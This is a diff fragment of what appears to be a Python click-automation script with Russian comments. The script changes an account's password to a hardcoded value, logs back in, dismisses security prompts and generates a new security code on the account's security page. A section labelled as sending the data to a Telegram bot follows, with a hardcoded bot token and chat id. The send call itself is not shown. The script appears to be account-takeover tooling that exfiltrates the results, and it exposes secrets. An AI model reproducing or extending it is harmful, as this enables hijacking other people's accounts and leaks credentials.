@@ -96,13 +96,14 @@ click(97, 297, 1, 0, 'left'); keyboard.write(account_password, delay=0.1); sleep
 click(88, 388, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.1); sleep(1.5) # вводим новый пасс 1
 click(102, 489, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.1); sleep(1.5) # вводим новый пасс 2
 click(110, 629, 1, 0, 'left'); sleep(15) # подтверждаем изменение пасса
+click(718, 629, 1, 0, 'left'); sleep(2); click(812, 629, 1, 0, 'left'); sleep(1);
 click(518, 461, 1, 0, 'left'); keyboard.write('56981488228Simak', delay=0.2); sleep(2.5); click(712, 625, 1, 0, 'left'); sleep(15) # во время разлогина заходим снова под акк
 #click(20, 59, 1, 0, 'left'); sleep(8); click(451, 460, 1, 0, 'left'); sleep(1); keyboard.write('56981488228Simak', delay=0.2); sleep(2.5); click(717, 622, 1, 0, 'left'); sleep(8) # перелогин на случай краша страницы
 click(1010, 362, 1, 0, 'left'); click(806, 142, 1, 0, 'left'); sleep(11) # закрываем еще одно окно навязывания хуйни для защиты
 click(717, 621, 1, 0, 'left'); sleep(15); # переходим в секьюрити
 scroll(-3200); sleep(2); click(123, 725, 1, 0, 'left'); sleep(7); click(491, 551, 1, 0, 'left'); sleep(2) # скролим вниз и генерим новый код и подтверждаем
 click(132, 17, 1, 0, 'left'); sleep(2); click(224, 234, 1, 0, 'left'); sleep(7); click(116, 105, 1, 0, 'left'); # обновляем страничку азур путем кликами по иконкам :)
-################# ОТПРАВЛЕНИЕ ДАННЫХ В ТГ БОТ BOTINOK 
+################# ОТПРАВЛЕНИЕ ДАННЫХ В ТГ БОТ BOTINOK
 TOKEN = "6619003611:AAGRivvPR1q5XZbnNh0RgZ5Y86_FBlpkTOE"
 now_time = str(datetime.now())
 chat_id = '506640934'
